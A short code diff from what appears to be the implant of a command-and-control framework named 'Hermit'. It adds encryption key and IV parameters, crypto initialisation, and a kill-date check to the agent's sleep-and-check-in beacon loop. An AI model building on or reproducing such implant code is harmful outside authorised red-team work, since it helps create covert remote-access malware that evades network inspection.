@@ -18,7 +18,9 @@ namespace Hermit
 		LPCWSTR			lpReqPathWebSocket,
 		INT 			nSleep,
 		INT				nJitter,
-		INT				nKillDate
+		INT				nKillDate,
+		LPCWSTR 		lpKey,
+		LPCWSTR 		lpIV
 	) {
 
 		HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
@@ -36,6 +38,7 @@ namespace Hermit
 
 		State::PSTATE pState = new State::STATE;
 
+		pState->pCrypt				= Crypt::InitCrypt(lpKey, lpIV);
 		pState->pTeb 				= NtCurrentTeb();
 		pState->hNTDLL				= hNTDLL;
 		pState->hWinHTTPDLL			= hWinHTTPDLL;
@@ -79,6 +82,9 @@ namespace Hermit
 		do
 		{
 			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
+
+			if (Handler::IsKillDateReached(pState->nKillDate))
+				pState->bQuit = TRUE;
 
 			if (Handler::CheckIn(pState, wInfoJson))
 				break;
